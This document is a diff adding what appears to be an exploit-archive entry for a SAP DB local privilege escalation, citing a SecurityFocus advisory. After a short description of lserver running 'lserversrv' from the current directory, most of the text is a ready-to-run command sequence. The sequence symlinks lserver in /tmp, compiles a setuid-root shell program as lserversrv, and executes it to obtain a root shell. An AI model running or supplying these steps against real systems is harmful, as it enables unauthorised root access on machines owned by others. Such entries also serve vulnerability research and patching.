@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/6316/info
+
+A vulnerability has been discovered in SAP DB that may allow an unprivileged to execute commands with root privileges. The vulnerability is due to insufficient sanity checks by lserver, when attempting to execute the 'lserversrv' binary in the current directory. 
+
+An attacker can exploit this vulnerability by creating a symbolic link to the 'lserver' binary in a directory containing a maliciously created 'lserversrv' binary. Executing lserver via the symbolic link will cause the malicious 'lserversrv' progam in the current directory to be executed.
+
+cd /tmp
+mkdir "snosoft+sapdb=root"
+cd "snosoft+sapdb=root"
+ln -s /usr/sapdb/depend/pgm/lserver lserver
+echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" > root.c
+cc -o root root.c
+cp root lserversrv
+./lserver
